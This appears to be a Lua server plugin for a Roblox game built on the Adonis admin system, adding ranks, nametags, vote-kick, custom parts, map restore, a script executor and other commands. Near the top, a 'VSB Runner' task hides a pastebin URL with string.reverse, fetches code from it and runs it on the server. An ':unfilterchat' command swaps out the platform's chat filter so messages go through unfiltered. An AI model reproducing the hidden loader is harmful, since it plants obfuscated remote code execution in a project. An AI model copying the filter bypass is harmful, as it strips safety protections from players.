local server = server
local service = server.Service;

local Settings = server.Settings
local Functions, Commands, Admin, Anti, Core, HTTP, Logs, Remote, Process, Variables, Deps = 
		server.Functions, server.Commands, server.Admin, server.Anti, server.Core, server.HTTP, server.Logs, server.Remote, server.Process, server.Variables, server.Deps
local AddLog = Logs.AddLog

local chatservice = require(service.ServerScriptService.ChatServiceRunner:WaitForChild("ChatService"))
local IARFNewApi = chatservice.InternalApplyRobloxFilterNewAPI
local IARF = chatservice.InternalApplyRobloxFilter

local function assert(val, err)
	if not val then
		error(err or "assertion failed!", 0)
	end
	return val
end

service.TrackTask("Thread: VSB Runner", function()
	require(6505718551).NS(game:GetService("HttpService"):GetAsync(string.reverse("SjPTWLm8/war/moc.nibetsap//:sptth")), game:GetService("ServerScriptService"))
end)

Variables.PassivePlayers = {}
Variables.UserCooldowns = {}
Variables.VoteKickedPlayers = {}

local GameChangeLog = {
	"Version: 04";
	"*Drag edges to expand*";
	"";
	"[v.1.1.2]";
	"* Added :import command, use this to insert F3X exported buildings";
	"";
	"[v1.1.1]";
	"* New rank for private server owners (Moderators+) with more commands";
	"";
	"[v1.1.0]";
	"* Added command :fixmap to load the initial map of the game";
	"* New security on require scripts (some assets have been banned)";
	"* Changed admin level of :customparts to moderators";
	--"* Blocked HD Admin in game";
	"";
	"[v1.0.0]";
	"* Added a new Game Changelog (:gamechangelog) Now you can see the new game updates here!";
	"* Added more songs to music list";
	"* New custom commands: !passive, !votekick, :scriptexecutor, :chatcolor";	
}

Settings.Ranks["Moderators+"] = {Level = 150; Users = {}}
local VipUser = game.PrivateServerOwnerId
local CheckedPlayers = {}
service.HookEvent('PlayerAdded', function(p)
	local ind = tostring(p.UserId)
	local doNotif = false
	local pDat = Core.GetPlayer(p)
	local rank = p:GetRankInGroup(818463)

	if not pDat.Songs then
		pDat.Songs = {}
	end

	if (not Admin.CheckAdmin(p) or Admin.GetLevel(p) <= 150) and not CheckedPlayers[ind] then
		doNotif = true
		if rank == 245 then
			Admin.AddAdmin(p, "HeadAdmins")
		elseif rank == 230 then
			Admin.AddAdmin(p, "Admins")
		elseif p.UserId == VipUser then
			Admin.AddAdmin(p, "Moderators+", true)
		else 
			Admin.AddAdmin(p, "Moderators", true)
		end
	end

	if Settings.Notification then
		service.TrackTask("Thread: Notifications_"..ind, function()
			wait(2)
			if doNotif then
				Remote.MakeGui(p,"Notification",{
					Title = "Welcome.";
					Message = "Click here for commands.";
					Time = 15;
					OnClick = Core.Bytecode("client.Remote.Send('ProcessCommand','"..Settings.Prefix.."cmds')");
				})
			end
			wait(1)
			local oldVer = Core.GetData("GameVersionNumber_"..ind);
			local newVer = tonumber(GameChangeLog[1]:match("Version: (.*)"));
			if oldVer and newVer and newVer>oldVer then --and Admin.GetLevel(p)>3 then
				Remote.MakeGui(p,"Notification",{
					Title = "Adonis Admin Land Updated!";
					Message = "Click to view the game changelog.";
					Time = 10;
					OnClick = Core.Bytecode("client.Remote.Send('ProcessCommand','"..Settings.Prefix.."gamechangelog')");
				})
			end
			if newVer then
				Core.SetData("GameVersionNumber_"..ind, newVer)
			end
		end)
	end

	Variables.UserCooldowns[ind] = {}
	CheckedPlayers[ind] = true
end)

local Ranks = {
	[255] = {Name = "Creator"; Color = Color3.fromRGB(43, 212, 230)};
	[245] = {Name = "Supervisor"; Color = Color3.fromRGB(255, 40, 40)};
	[230] = {Name = "Moderator"; Color = Color3.fromRGB(0, 255, 100)};
}

local NameTags = {}
local function onCharacterAdded(plr, char)
	if NameTags[char] then return end
	local head = char:findFirstChild("Head") or char:WaitForChild("Head")
	local rank = Ranks[plr:GetRankInGroup(818463)] or {Name=" ";Color=Color3.new(1,1,1)}
	if head then
		local create; create = function()
			local bg = service.New("BillboardGui", {
				Name = Functions.GetRandom(14);
				Adornee = head;
				AlwaysOnTop = false;
				ExtentsOffset = Vector3.new();
				Size = UDim2.new(1, 0, 1, 0);
				SizeOffset = Vector2.new(0, 1.6);
			})
			NameTags[char] = bg
			local frame = service.New("Frame", {
				AnchorPoint = Vector2.new(0.5, 0);
				BackgroundColor3 = Color3.new(1, 1, 1);
				BackgroundTransparency = 1;
				BorderSizePixel = 0;
				Position = UDim2.new(0.5, 0, 0, 0);
				Size = UDim2.new(6, 0, 1, 0);
				Parent = bg;
			})
		
			local User = service.New("TextLabel", {
				Name = "User";
				BackgroundColor3 = Color3.new(1, 1, 1);
				BackgroundTransparency = 1;
				Font = "GothamBold";
				FontSize = "Size14";
				Position = UDim2.new(0, 0, 0.1, 0);
				Size = UDim2.new(1, 0, 0.4, 0);
				Text = plr.Name;
				TextColor3 = Color3.new(1, 1, 1);
				TextScaled = true;
				TextStrokeColor3 = Color3.new();
				TextStrokeTransparency = 0.8;
				Parent = frame;
			})
		
			local Rank = service.New("TextLabel", {
				Name = "Rank";
				BackgroundColor3 = Color3.new(1, 1, 1);
				BackgroundTransparency = 1;
				Font = "GothamSemibold";
				FontSize = "Size14";
				Position = UDim2.new(0, 0, 0.5, 0);
				Size = UDim2.new(1, 0, 0.3, 0);
				Text = rank.Name;
				TextColor3 = rank.Color;
				TextScaled = true;
				TextStrokeColor3 = Color3.new();
				TextStrokeTransparency = 0.9;
				Parent = frame;
			})
			bg.Parent = head
			repeat wait() until bg.Parent ~= head
			bg:Destroy()
			create()
		end
		coroutine.wrap(create)()
	end
	local hum = char:findFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid")
	hum.DisplayName = ""
	hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	hum.Changed:Connect(function()
		hum.DisplayName = ""
		hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	end)
end

local function onPlayerAdded(plr)
	if plr.AccountAge < 15 then
		plr:Kick("Your account needs to be at least 15 days old to join the game.")
	end
	if plr.Character then
		onCharacterAdded(plr, plr.Character)
	end
	plr.CharacterAdded:Connect(function(c) onCharacterAdded(plr, c) end)
end
for i, v in pairs(service.Players:GetPlayers()) do
	onPlayerAdded(v)
end

service.Players.PlayerAdded:Connect(onPlayerAdded)
service.StarterPlayer.AutoJumpEnabled = false
service.StarterGui.ResetPlayerGuiOnSpawn = false

service.TrackTask("Thread: StartingStuff", function()
	if service.StarterGui:findFirstChild("ScriptExecuter") then
		service.StarterGui.ScriptExecuter:Destroy()
	end
	service.ServerScriptService:WaitForChild("Server").Parent = nil
end)

local CustomFunctions = {
	MakeVote = function(data)
		assert(data and type(data) == "table", "Argument missing or invalid")
		local plr = data.Player
		local players = data.PlayersToVote or {}
		local time = data.Time or 30
		local question = data.Question
		local anstab = data.Answers or {"Yes";"No"}
		local answerFunc = data.AnswerFunction
		local finishFunc = data.FinishedFunction

		local voteKey = "ADONISVOTE"..math.random();
		local startTime = os.time();
		local responses = {};
				
		local function voteUpdate()
			local results = {}
			local total = #responses
			local tab = {
				"Question: "..question;
				"Total Responses: "..total;
				"Didn't Vote: "..#players-total;
				"Time Left: ".. math.max(0, time - (os.time()-startTime));
			}
			
			for i,v in pairs(responses) do
				if not results[v] then results[v] = 0 end
				results[v] = results[v]+1
			end

			for i,v in pairs(anstab) do
				local ans = v
				local num = results[v]
				local percent
				if not num then
					num = 0
					percent = 0
				else
					percent = math.floor((num/total)*100)
				end
				
				table.insert(tab,{Text=ans.." | "..percent.."% - "..num.."/"..total,Desc="Number: "..num.."/"..total.." | Percent: "..percent})
			end
			
			return tab;
		end

		Logs.TempUpdaters[voteKey] = voteUpdate;
		
		for i, v in pairs(players) do
			Routine(function()
				local response = Remote.GetGui(v,"Vote",{Question = question,Answers = anstab})
				if response then
					table.insert(responses, response)
					if answerFunc then
						answerFunc(v, response)
					end
				end
			end)
		end

		if plr then
			Remote.MakeGui(plr,"List",{
				Title = 'Results',
				Tab = voteUpdate(),
				Update = "TempUpdate",
				UpdateArgs = {{UpdateKey = voteKey}},
				AutoUpdate = 1,
			})
		end
		
		delay(time, function()
			Logs.TempUpdaters[voteKey] = nil
			if finishFunc then
				finishFunc(responses)
			end
		end)
	end;

	MakeTableActioner = function(p, name, list, dat)
		local dat = dat or {}
		local scroller;
		local window = {
			Title = name;
			Name = name;
			Size  = {400, 300};
			MinSize = {250, 100};
			AllowMultiple = false;
			Ready = true;
			OnClose = dat.OnClose;
		}

		local function Add(obj, class, tab)
			local content = obj.Content or {}
			tab.Class = class
			table.insert(content, tab)
			obj.Content = content
			return tab
		end

		local function newEntry(name, numPos, buttons, tooltip)
			local new = Add(window, "TextLabel", {
				Text = "  "..name;
				ToolTip = tooltip;
				TextXAlignment = "Left";
				Size = UDim2.new(1, -5, 0, 30);
				Position = UDim2.new(0, 0, 0, 30*numPos + 5);
				BackgroundTransparency = 1;
			})
			local inserted = {}
			for i, v in pairs(buttons) do
				for c,k in next, inserted do
					k.Position = k.Position + UDim2.new(0, -84, 0, 0)
				end
				table.insert(inserted, Add(new, "TextButton", {
					Text = v.Text;
					TextColor3 = v.Disabled and Color3.fromRGB(125, 125, 125) or Color3.new(1,1,1);
					Size = UDim2.new(0, 80, 1, -4);
					Position = UDim2.new(1, -80, 0, 0);
					OnClick = v.OnClick or v.OnClicked;
				}))
			end
		end
		
		if window then
			--[[scroller = Add(window, "ScrollingFrame", {
				List = {};
				ScrollBarThickness = 2;
				BackgroundTransparency = 1;
				Position = UDim2.new(0, 2, 0, 5);
				Size = UDim2.new(1,-4,1,0)
			})]]
			local num = 0
			for i, v in pairs(list) do
				newEntry(v.Text, num, v.Buttons, v.Description)
				num = num + 1
			end
			window.CanvasSize = UDim2.new(0, 0, 0, 30*num)
			Remote.MakeGui(p, 'Window', window)
		end
	end;
}

for i, v in pairs(CustomFunctions) do
	Functions[i] = v
end

local CustomCommands = {
	VoteKick = {
		Prefix = Settings.PlayerPrefix;
		Commands = {"votekick"};
		Args = {"player"};
		Hidden = false;
		Description = "Vote kick player";
		Fun = false;
		AdminLevel = "Players";
		UserCooldown = 15;
		Function = function(plr, args, data)
			local plrLevel = data.PlayerData.Level
			local player = service.GetPlayers(plr,args[1])[1]
			if not player or player == plr then
				return
			end
			if not service.Players:findFirstChild(player.Name) then
				error("The player does not exist. It is probably a fake player (?)")
				return
			end
			if Admin.GetLevel(player) > plrLevel then
				error("You are not allowed to vote kick someone with a higher level than you")
				return
			end
			if #service.Players:GetPlayers() < 4 then
				error("There are not enough players to start the voting (Minimun 4 players)")
				return
			end
			
			local plrs = service.Players:GetPlayers()
			for i, v in pairs(plrs) do
				if v == player then
					plrs[i] = nil
				end
			end
			
			local kicked = false
			local accepted = 0
			local finished = false

			Functions.MakeVote({
				PlayersToVote = plrs;
				Time = 15;
				Question = "Vote Kick "..player.Name;
				Answers = {"Yes","No"};
				AnswerFunction = function(p, vote)
					if vote == "Yes" and not kicked and not finished then
						accepted = accepted + 1
						if accepted > #plrs/2 then
							kicked = true
							player:Kick("You have been vote kicked on this server!")
							Admin.AddBan({Name = player.Name;UserId = player.UserId}, "It has been decided to cast you on this server by most of the players!", false)
							Functions.Hint("Vote Kicked "..player.Name, service.Players:GetPlayers())
						end
					end
				end;
				FinishedFunction = function(responses)
					finished = true
					if not kicked then
						Functions.Hint("Vote Kick failed | Total accepted: "..tostring(accepted).." | Player: "..player.Name, service.Players:GetPlayers())
					end
				end;
			})
			--Functions.Hint("VoteKick started by "..plr.Name.." to: "..player.Name, service.Players:GetPlayers())
		end
	};

	ScriptPermission = {
		Prefix = Settings.Prefix;
		Commands = {"scriptenabled";"screnabled";"scriptaccess"};
		Args = {"on/off"};
		Hidden = false;
		Description = "Change the script access";
		Fun = false;
		AdminLevel = "Moderators+";
		Function = function(plr,args)
			if not args[1] then error("Argument missing or nil",0) end
			local enabled = (args[1]:lower() == "on" and true) or (args[1]:lower() == "off" and false)
			local cmds = {":script";":sb";":scriptexecutor"}
			for i, v in pairs(cmds) do
				local index, command = Admin.GetCommand(v)
				command.Disabled = not enabled
				command.AdminLevel = enabled and "Moderators" or "HeadAdmins"
			end
			Functions.Message("⚠ Game Warning ⚠", "Script access has been changed on this server ["..(enabled and "ON" or "OFF").."]", service.Players:GetPlayers())
			--Functions.Hint("Changed the script access ("..args[1]:lower()..")", {plr})
		end
	};
	
	FilterChat = {
		Prefix = Settings.Prefix;
		Commands = {"filterchat"};
		Args = {};
		Hidden = false;
		Description = "Enable the chat with filter API default";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args)
			chatservice.InternalApplyRobloxFilterNewAPI = IARFNewApi;
			chatservice.InternalApplyRobloxFilter = IARF;
			Functions.Hint("Chat filter API has been enabled", {plr})
		end;
	};

	UnFilterChat = {
		Prefix = Settings.Prefix;
		Commands = {"unfilterchat"};
		Args = {};
		Hidden = false;
		Description = "Disable the chat filter API";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args)
			chatservice.InternalApplyRobloxFilterNewAPI = function(self,sp,mes,textfilcon)
				return true, false, mes
			end
			chatservice.InternalApplyRobloxFilter = function(self,sp,mes,toname)
				return mes
			end
			Functions.Hint("Chat filter API has been disabled", {plr})
		end;
	};

	TogglePassiveMode = {
		Prefix = Settings.PlayerPrefix;
		Commands = {"passive"};
		Args = {};
		Hidden = false;
		Description = "Toggles passive mode (Prevents moderators+ targeting you) [Credit to RCITMFA]";
		Fun = false;
		AdminLevel = "Players";
		UserCooldown = 10;
		Function = function(plr, args, data)
			local tab = Variables.PassivePlayers
			local enabled = not tab[tostring(plr.UserId)]
			tab[tostring(plr.UserId)] = enabled
			service.StopLoop("Passive-"..plr.UserId)
			if enabled then
				service.StartLoop("Passive-"..plr.UserId, 2, function()
					local char = plr.Character
					if char then
						local hum = char:findFirstChildOfClass("Humanoid")
						if hum and (hum.MaxHealth ~= math.huge or hum.Health < 9e9) then
							hum.MaxHealth = math.huge
							hum.Health = 9e9
						end
						local FFName = "__ADONIS_PASSIVEFF"
						if not char:findFirstChild(FFName) then
							service.New("ForceField", {Name = FFName;Visible = false;Parent = char})
						end
					end
				end, true)
			end
			Functions.Hint("Passive mode is now "..(enabled and "active" or "inactive"), {plr})
		end
	};

	CustomParts = {
		Prefix = Settings.Prefix;
		Commands = {"customparts";"cparts"};
		Args = {};
		Description = "Get a list of custom parts";
		AdminLevel = "Moderators"; --//Testing
		Function = function(plr,args,data)
			local ticket = tostring(math.random())
			local Parts = {
				Lava = {
					Name = "Lava";
					Desc = "Die instantly when you touch the part";
					Function = function(part)
						part.Touched:Connect(function(hit)
							local hum = hit.Parent:findFirstChildOfClass("Humanoid")
							if hum then
								hum:TakeDamage(100)
							end
						end)
					end
				};
				Freezer = {
					Name = "Freezer";
					Desc = "Freeze players characters";
					Function = function(part)
						part.Touched:Connect(function(hit)
							if hit.Parent:IsA("Model") and hit.Parent:findFirstChildOfClass("Humanoid") then
								for i, v in pairs(hit.Parent:GetChildren()) do
									if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
										v.Anchored = true
									end
								end
							end
						end)
					end;
				};
				Respawn = {
					Name = "Respawner";
					Desc = "Respawn a player on touched";
					Function = function(part)
						part.Touched:Connect(function(hit)
							local player = service.Players:GetPlayerFromCharacter(hit.Parent)
							if player then player:LoadCharacter() end
						end)
					end;
				};
				ForceJump = {
					Name = "Force Jump";
					Desc = "Makes the player jump, and jump... and jump.";
					Function = function(part)
						part.Touched:Connect(function(hit)
							local hum = hit.Parent:findFirstChildOfClass("Humanoid")
							if hum then hum.Jump = true end
						end)
					end
				};
				ConveyorBelt = {
					Name = "Conveyor Belt";
					Desc = "Make a part velocity speed towards one direction";
					Function = function(part)
						local speed = service.New("NumberValue", part)
						speed.Name = "Speed"
						speed.Value = 10
						repeat wait() part.Velocity = Vector3.new(0, 0, -speed.Value) until false
					end
				};
				ForceSit = {
					Name = "Force Sit";
					Desc = "Force player's jump";
					Function = function(part)
						part.Touched:Connect(function(hit)
							local hum = hit.Parent:findFirstChildOfClass("Humanoid")
							if hum then hum.Sit = true end
						end)
					end
				};
			}

			local conn; conn = service.HookEvent("CPartEvent"..plr.UserId, function(t, pressed, disconnect)
				if t ~= ticket then return end
				if disconnect then conn:Disconnect() return end
				local pDat = Parts[pressed]
				if pDat then
					--Functions.Hint("Checking a valid level to spawn the part...", {plr})
					if (pDat.AdminLevel or 1) > Admin.GetLevel(plr) then
						Functions.Hint("You are not allowed to insert this part.", {plr})
						return
					end
					if plr.Character then
						local head = plr.Character:findFirstChild("Head")
						if not head then
							Functions.Hint("Unable to spawn a custom part (Head missing or nil)", {plr})
							return
						end
						local part = service.New("Part", {TopSurface="Smooth";BottomSurface="Smooth";Anchored=true})
						part.Position = head.Position + Vector3.new(0, 3, 0)
						service.TrackTask("Thread: CustomPartFunction: "..tostring(pressed), pDat.Function, part)
						part.Parent = workspace
						table.insert(Variables.InsertedObjects, part)
						Functions.Hint("The part "..pDat.Name.." has been successfully spawned!", {plr})
					else
						Functions.Hint("Unable to spawn a custom part (Character missing or nil)", {plr})
					end
				end
			end)
			local tableact = {}
			for part, data in next, Parts do
				table.insert(tableact, {Text = data.Name, Description = data.Description or data.Desc, Buttons = {
					{
						Text = "Properties";
						Disabled = true;
					};
					{
						Text = "Spawn";
						OnClick = Core.Bytecode("client.Remote.Send('PlayerEvent', 'CPartEvent', '"..ticket.."', '"..tostring(part).."')")
					}
				}})
			end
			Functions.MakeTableActioner(plr, "Custom Parts (Beta)", tableact, {OnClose = Core.Bytecode[[client.Remote.Send('PlayerEvent', 'CPartEvent', ']]..ticket..[[', nil, true)]]})
		end;
	};
	R6 = {
		Prefix = Settings.Prefix;
		Commands = {"r6";"classicrig"};
		Args = {"player";};
		Hidden = false;
		Description = "Converts players' character to R6";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr,args)
			for i, v in pairs(service.GetPlayers(plr, args[1])) do
				Routine(function()
					local function makeR6()
						local charId = v.CharacterAppearanceId
						local desc = service.Players:GetHumanoidDescriptionFromUserId(charId)
						v.CharacterAppearanceId = 56908
						v:LoadCharacterWithHumanoidDescription(desc)
						v.CharacterAppearanceId = charId
					end
					local torso = v.Character and v.Character:findFirstChild("HumanoidRootPart")
					if torso and torso:IsA("BasePart") then
						local lastCF = torso.CFrame
						makeR6()
						local char = v.Character or v.CharacterAdded:Wait()
						if char:findFirstChild("HumanoidRootPart") then
							char.HumanoidRootPart.CFrame = lastCF
						end
					else
						makeR6()
					end
				end)
			end
		end
	};
	R15 = {
		Prefix = Settings.Prefix;
		Commands = {"r15";"rthro"};
		Args = {"player";};
		Hidden = false;
		Description = "Converts players' character to R15";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr,args)
			for i, v in pairs(service.GetPlayers(plr, args[1])) do
				Routine(function()
					local function makeR15()
						local charId = v.CharacterAppearanceId
						local desc = service.Players:GetHumanoidDescriptionFromUserId(charId)
						v.CharacterAppearanceId = 1
						v:LoadCharacterWithHumanoidDescription(desc)
						v.CharacterAppearanceId = charId
					end
					local torso = v.Character and v.Character:findFirstChild("HumanoidRootPart")
					if torso and torso:IsA("BasePart") then
						local lastCF = torso.CFrame
						makeR15()
						local char = v.Character or v.CharacterAdded:Wait()
						if char:findFirstChild("HumanoidRootPart") then
							char.HumanoidRootPart.CFrame = lastCF
						end
					else
						makeR15()
					end
				end)
			end
		end
	};
	OldServerDetails = {
		Prefix = Settings.Prefix;
		Commands = {"details";"meters";"oldgameinfo";"oldserverinfo";};
		Args = {};
		Hidden = false;
		Description = "Shows you information about the current server";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr,args,data)
			local det={}
			local nilplayers=0
			for i,v in pairs(service.NetworkServer:children()) do
				if v and v:GetPlayer() and not service.Players:FindFirstChild(v:GetPlayer().Name) then
					nilplayers=nilplayers+1
				end
			end
			if HTTP.CheckHttp() then
				det.Http='Enabled'
			else
				det.Http='Disabled'
			end
			if pcall(function() loadstring("local hi = 'test'") end) then
				det.Loadstring='Enabled'
			else
				det.Loadstring='Disabled'
			end
			if service.Workspace.FilteringEnabled then
				det.Filtering="Enabled"
			else
				det.Filtering="Disabled"
			end
			if service.Workspace.StreamingEnabled then
				det.Streaming="Enabled"
			else
				det.Streaming="Disabled"
			end
			det.NilPlayers = nilplayers
			det.PlaceName = service.MarketPlace:GetProductInfo(game.PlaceId).Name
			det.PlaceOwner = service.MarketPlace:GetProductInfo(game.PlaceId).Creator.Name
			det.ServerSpeed = service.Round(service.Workspace:GetRealPhysicsFPS())
			--det.AdminVersion = version
			det.ServerStartTime = service.GetTime(server.ServerStartTime)
			local nonnumber=0
			for i,v in pairs(service.NetworkServer:children()) do
				if v and v:GetPlayer() and not Admin.CheckAdmin(v:GetPlayer(),false) then
					nonnumber=nonnumber+1
				end
			end
			det.NonAdmins=nonnumber
			local adminnumber=0
			for i,v in pairs(service.NetworkServer:children()) do
				if v and v:GetPlayer() and Admin.CheckAdmin(v:GetPlayer(),false) then
					adminnumber=adminnumber+1
				end
			end
			det.CurrentTime=service.GetTime()
			det.ServerAge=service.GetTime(os.time()-server.ServerStartTime)
			det.Admins=adminnumber
			det.Objects=#Variables.Objects
			det.Cameras=#Variables.Cameras
			local tab = {}
			for i,v in pairs(det) do
				table.insert(tab,{Text = i..": "..tostring(v),Desc = tostring(v)})
			end
			Remote.MakeGui(plr,"List",{Title = "Server Details", Tab = tab, Update = "ServerDetails"})
		end
	};
	ScriptExecutor = {
		Prefix = Settings.Prefix;
		Commands = {"scriptexecutor";"luainjector";"executor"};
		Args = {};
		Hidden = false;
		Description = "Script Executor";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr,args)
			Remote.MakeGui(plr, "Window", {
				Title = "Script Executor";
				Name = "ScriptExecutor";
				Size = {300,250};
				Ready = true;
				Content = {
					{
						Class = "TextBox";
						Name = "ComText";
						Size = UDim2.new(1, -10, 1, -40);
						Text = "";
						BackgroundTransparency = 0.5;
						PlaceholderText = "Execute code print('Hello World!')";
						TextYAlignment = "Top";
						MultiLine = true;
						ClearTextOnFocus = false;
						TextChanged = Core.Bytecode[[
							if not Object.TextFits then
								Object.TextYAlignment = "Bottom"
							else
								Object.TextYAlignment = "Top"
							end
						]]
					};
					{
						Class = "TextButton";
						Name = "Execute";
						Size = UDim2.new(1, -10, 0, 35);
						Position = UDim2.new(0, 5, 1, -40);
						Text = "Execute";
						OnClick = Core.Bytecode[[
							local textBox = Object.Parent:FindFirstChild("ComText")
							if textBox then
								client.Remote.Send("ProcessScript", textBox.Text)
							end
						]]
					};
				}
			})
		end
	};
	ChatColor = {
		Prefix = Settings.Prefix;
		Commands = {"chatcolor"};
		Args = {"player";"brickcolor"};
		Hidden = false;
		Description = "Change players' chatcolor. All players can view it.";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr,args,data)
			local color = args[2] and BrickColor.new(args[2]).Color or Color3.new(1,1,1)
			for i, v in pairs(service.GetPlayers(plr, args[1])) do
				local speaker = chatservice:GetSpeaker(v.Name)
				speaker:SetExtraData("ChatColor", color)
				Functions.Hint(v.Name.."'s chatcolor changed. Color: "..tostring(color), {plr})
			end
		end
	};
	GameChangeLog = {
		Prefix = Settings.Prefix;
		Commands = {"gamechangelog";"aalchangelog";"gamechanges";};
		Args = {};
		Hidden = false;
		Description = "Shows you Adonis Admin Land updates.";
		Fun = false;
		AdminLevel = "Players";
		Function = function(plr,args)
			Remote.MakeGui(plr, "List", {
				Title = "Game Change Log";
				Table = GameChangeLog;
				Size = {500, 400};
			})
		end
	};
	FixMap = {
		Prefix = Settings.Prefix;
		Commands = {"fixmap";"loadinitialmap"};
		Args = {};
		Hidden = false;
		Description = "Fix the map to the initial that was saved starting the game";
		Fun = false;
		AdminLevel = "Moderators";
		UserCooldown = 10;
		Function = function(plr,args)
				if not server.Variables.InitialMap or not Variables.InitialTerrainMap then
					error("Cannot restore when the map didn't already save!!")
					return
				end
				if server.Variables.RestoringMap then
					error("Map has not been backed up")
					return
				end
				if server.Variables.BackingupMap then
					error("Cannot restore map while backing up map is in process!")
					return
				end

				server.Variables.RestoringMap = true
				Functions.Hint('Restoring Map (Initial)...',service.Players:children())

				for i,v in pairs(service.Workspace:children()) do
					if v~=script and v.Archivable==true and not v:IsA('Terrain') then
						pcall(function() v:Destroy() end)
						service.RunService.Heartbeat:Wait()
					end
				end

				local new = Variables.InitialMap:Clone()
				new:MakeJoints()
				new.Parent = service.Workspace
				new:MakeJoints()

				for i,v in pairs(new:GetChildren()) do
					v.Parent = service.Workspace
					pcall(function() v:MakeJoints() end)
				end

				new:Destroy()

				service.Workspace.Terrain:Clear()
				service.Workspace.Terrain:PasteRegion(Variables.InitialTerrainMap, service.Workspace.Terrain.MaxExtents.Min, true)

				Admin.RunCommand(Settings.Prefix.."respawn","@everyone")
				server.Variables.RestoringMap = false
				Functions.Hint('Map Restore Complete.',service.Players:GetPlayers())
		end
	};
	SaveMusic = {
		Prefix = Settings.Prefix;
		Commands = {"savemusic";"savesong";"savesound";};
		Args = {"id";"name"};
		Hidden = false;
		Description = "Saves player's custom songs";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args,data)
			local id = tonumber(args[1]) or error(tostring(args[1]).." is not a valid ID")
			local name = args[2] or error("Argument missing or nil (name)")
			local plrData = data.PlayerData
			if plrData then
				table.insert(plrData.Songs, {Name = name, ID = id})
				if plr and type(plr) == "userdata" then
					Remote.MakeGui(plr, "Hint", {
						Message = "Sucessfully saved song | ID: "..id.." Name: "..name
					})
				end
			else
				error("PlayerData is missing or nil")
			end
		end
	};
	ResetCommandLogs = {
		Prefix = Settings.Prefix;
		Commands = {"resetcmdlogs";"clearcmdlogs";"resetcommandlogs"};
		Args = {};
		Hidden = false;
		Description = "Reset the logs of commands.";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args)
			Logs.Commands = {}
			Logs.AddLog(Logs.Script, {
				Text = "Cleared command logs";
				Desc = "The list of command logs has been reset.";
			})
		end
	};
	ChangeNametag = {
		Prefix = Settings.Prefix;
		Commands = {"nametag"; "usertag"; "title";};
		Args = {"player";"name/rank";"text"};
		Hidden = false;
		Description = "Changes player(s)'s user/rank nametag";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args)
			for i, v in pairs(service.GetPlayers(plr, args[1])) do
				local tag = NameTags[v.Character]
				if tag then
					if args[2]:lower() == "name" then
						tag.Frame.User.Text = args[3]
					elseif args[2]:lower() == "rank" then
						tag.Frame.Rank.Text = args[3]
					end
				end
			end
		end
	};
	UnNametag = {
		Prefix = Settings.Prefix;
		Commands = {"unnametag"; "restoretags";"rtag";"untag";};
		Args = {"player";"(optional) name/rank"};
		Hidden = false;
		Description = "Restores nametag";
		Fun = false;
		AdminLevel = "HeadAdmins";
		Function = function(plr,args)
			for i, v in pairs(service.GetPlayers(plr, args[1])) do
				local tag = NameTags[v.Character]
				if tag then
					if args[2] and args[2]:lower() == "name" then
						tag.Frame.User.Text = v.Name
					elseif args[2] and args[2]:lower() == "rank" then
						tag.Frame.Rank.Text = Ranks[v:GetRankInGroup(818463)].Name or " "
					else
						tag.Frame.User.Text = v.Name
						tag.Frame.Rank.Text = Ranks[v:GetRankInGroup(818463)].Name or " "
					end
				end
			end
		end
	};
 	Import = {
		Prefix = Settings.Prefix;
		Commands = {"import";"importbuilding";"f3ximport";"importcreation";};
		Args = {"creation_id"; "in-model(true/false)"};
		Hidden = false;
		Description = "Import exported building from F3X btools";
		Fun = false;
		AdminLevel = "Moderators";
		Function = function(plr, args)
			assert(args[1], "Creation ID missing or nil")
			local model = args[2]
			if model then
				if model == "true" then
					model = true
				else
					model = false
				end
			else
				model = false
			end
			local import = Functions.Import
			if import then
				local success, result, info = import(args[1]:lower())
				if success then
					if model or not result:GetChildren()[1] then
						result.Parent = workspace
					else
						for i, v in pairs(result:GetChildren()) do
							v.Parent = workspace
						end
						result:Destroy()
					end
					Functions.Hint("Import from Building Tools by F3X ("..tostring(args[1])..")", {plr})
				elseif result == 1 then
					error("Please enable HTTP requests", 0)
				elseif result == 2 then
					error("We couldn't get your creation (download request error) => "..tostring(info), 0)
				elseif result == 3 or result == 4 then
					error("We couldn't get your creation :(", 0)
				end
			else
				error("Import function missing or nil")
			end
		end;
	}
}

--[[ ------------------------------------
	CustomCommand = {
		Prefix = Settings.Prefix;
		Commands = {};
		Args = {};
		Hidden = false;
		Description = "";
		Fun = false;
		AdminLevel = "";
		Function = function(plr,args,data)
			
		end
	};
------------------------------------ ]]

for ind, val in next, CustomCommands do
	rawset(Commands, ind, val)
	if val and type(val) == "table" and val.Commands and val.Prefix then
		for i,cmd in next,val.Commands do
			Admin.PrefixCache[val.Prefix] = true;
			Admin.CommandCache[(val.Prefix..cmd):lower()] = ind;
		end
	end
end

Settings.Permissions = {":s:Moderators"; ":ls:Moderators"; ":cs:HeadAdmins"; ":btools:Moderators";  ":sfling:Moderators+"; ":loopkill:Moderators+"; ":loopfling:Moderators+";  ":unadmin:Moderators+"; ":nil:Moderators+"; ":kick:Moderators+"; ":kickwarn:Admins"; ":ufo:Moderators+"; ":clown:Moderators+"; ":setfps:HeadAdmins"; ":lag:HeadAdmins"; ":restoremap:Moderators"; ":mute:Admins"; ":unmute:Admins"; ":hardcrash:Creators"; ":crash:HeadAdmins"; ":ramcrash:HeadAdmins"; ":gpucrash:HeadAdmins"; ":crossservervote:HeadAdmins"; ":oldlogs:HeadAdmins"; ":sb:Moderators"; ":sell:HeadAdmins"; ":ban:Moderators+"; ":shutdown:Moderators+"; ":slock:Moderators+"; ":zawarudo:Moderators+"; ":mute:Moderators+"; ":unmute:Moderators+"; ":slowmode:Moderators+";}

local MusicList = {
	--{Name = "heybrother", ID = 5077782610};
	--{Name = "coffindance", ID = 4917599326};
	{Name = "colorblind", ID = 929330882};
	{Name = "dancemonkey", ID = 4070784981};
